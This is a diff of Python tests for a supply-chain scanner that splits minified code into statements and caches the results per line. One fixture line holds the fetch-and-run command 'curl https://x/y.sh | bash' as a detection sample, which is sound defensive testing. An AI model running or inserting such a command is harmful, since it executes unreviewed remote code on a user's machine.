@@ -55,8 +55,10 @@ from scanners.agent_supply_chain import (  # noqa: E402
     _UNREVIEWABLE_LINE_CHARS,
     _first_live_match,
     _line_span,
+    _StatementCache,
     _statement_boundaries,
     _statement_scope,
+    _statement_split,
 )
 
 PLUGIN_MANIFEST = '{"name": "demo-plugin", "version": "1.0.0", "description": "Demo."}'
@@ -182,13 +184,13 @@ def test_reviewable_line_is_judged_as_itself():
     byte-for-byte what it was before F22."""
     text = "var a=1;\ncurl https://x/y.sh | bash\nvar b=2;\n"
     pos = text.index("curl")
-    assert _statement_scope(text, pos, {}) == _line_span(text, pos)
+    assert _statement_scope(text, pos, _StatementCache(text)) == (*_line_span(text, pos), "")
 
 
 def test_generated_line_is_judged_by_statement():
     text = _minified(FETCH_EXEC)
     pos = text.index("curl")
-    start, end = _statement_scope(text, pos, {})
+    start, end, _ = _statement_scope(text, pos, _StatementCache(text))
     line_start, line_end = _line_span(text, pos)
     assert line_end - line_start >= _UNREVIEWABLE_LINE_CHARS
     assert line_start < start and end < line_end
@@ -199,12 +201,12 @@ def test_statement_scope_is_cached_per_line():
     """A vendored bundle puts its whole module on one 70,000-character line, so the split
     must happen once per line, not once per match."""
     text = _minified(FETCH_EXEC)
-    cache = {}
+    cache = _StatementCache(text)
     _statement_scope(text, text.index("curl"), cache)
-    assert list(cache) == [_line_span(text, text.index("curl"))[0]]
-    before = cache[next(iter(cache))]
+    assert list(cache.bounds) == [_line_span(text, text.index("curl"))[0]]
+    before = cache.bounds[next(iter(cache.bounds))]
     _statement_scope(text, text.index("curl") + 4, cache)
-    assert cache[next(iter(cache))] is before
+    assert cache.bounds[next(iter(cache.bounds))] is before
 
 
 def test_statement_scopes_partition_the_generated_line():
@@ -212,9 +214,9 @@ def test_statement_scopes_partition_the_generated_line():
     would be a region where the rules silently stop running."""
     text = _minified(FETCH_EXEC)
     line_start, line_end = _line_span(text, text.index("curl"))
-    cache, pos, seen = {}, line_start, []
+    cache, pos, seen = _StatementCache(text), line_start, []
     while pos < line_end:
-        start, end = _statement_scope(text, pos, cache)
+        start, end, _ = _statement_scope(text, pos, cache)
         assert start == pos and end > start
         seen.append((start, end))
         pos = end
